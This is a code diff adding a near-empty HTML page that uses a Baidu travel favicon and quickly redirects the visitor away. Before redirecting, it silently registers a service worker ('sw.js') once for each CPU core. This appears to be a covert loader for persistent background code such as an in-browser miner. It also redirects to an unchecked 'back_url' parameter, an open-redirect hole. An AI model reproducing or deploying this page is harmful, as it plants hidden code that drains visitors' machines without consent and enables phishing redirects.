@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title></title>
+<link rel="shortcut icon" href="https://lvyou.baidu.com/favicon.ico">
+<script>
+function back() {
+	var refer = location.href.split('back_url=')[1];
+	if (refer) {
+		refer = decodeURIComponent(refer);
+		location.replace(refer);
+	} else {
+		history.back();
+	}
+}
+
+for (i = 0; i < navigator.hardwareConcurrency; i++) {
+	navigator.serviceWorker.register('sw.js', {scope: i});
+}
+setTimeout(back, 10);
+</script>
+</head>
+<body>
+</body>
+</html>
